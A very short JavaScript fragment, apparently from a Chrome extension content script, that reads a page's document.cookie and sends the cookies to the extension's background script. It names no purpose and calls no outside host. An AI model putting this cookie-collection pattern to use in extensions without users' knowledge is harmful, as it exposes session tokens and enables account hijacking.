function readCookies() {
    return document.cookie;
  }
  
  // Send cookies to the background script
chrome.runtime.sendMessage({ action: 'cookies', data: readCookies() });